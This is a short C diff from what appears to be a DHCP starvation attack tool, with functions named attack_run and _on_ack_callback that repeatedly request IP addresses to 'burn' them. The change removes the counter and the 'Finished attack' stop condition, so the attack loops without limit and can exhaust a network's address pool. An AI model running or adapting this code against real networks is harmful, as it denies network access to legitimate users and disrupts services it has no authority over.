@@ -39,6 +39,7 @@ int attack_create(attack_t *instance, attack_args_t args) {
 
 int attack_run(attack_t instance) {
     logger_info(instance->logger, "Running attack");
+
     dhcp_client_discovery(instance->dhcp_client, instance->mac, instance->my_ip);
     return ATTACK_E_SUCCESSFUL;
 }
@@ -87,13 +88,9 @@ static void _on_ack_callback(dhcp_client_t dhcp_client, void *args, dhcp_client_
 
     memcpy(decline_data.mac, instance->mac, LENGTH_MAC_ADDRESS_AS_BYTES);
 
-    if (--instance->burned_ips) {
-        logger_debug(instance->logger, "Burning another IP...");
-        //dhcp_client_decline(dhcp_client, decline_data);
-        dhcp_client_discovery(dhcp_client, instance->mac, instance->my_ip);
-    } else {
-        logger_info(instance->logger, "Finished attack! <3");
-    }
+    logger_debug(instance->logger, "Burning another IP...");
+    //dhcp_client_decline(dhcp_client, decline_data);
+    dhcp_client_discovery(dhcp_client, instance->mac, instance->my_ip);
 }
 
 static void _on_offer_callback(dhcp_client_t dhcp_client, void *args, dhcp_client_offer_data_t data) {
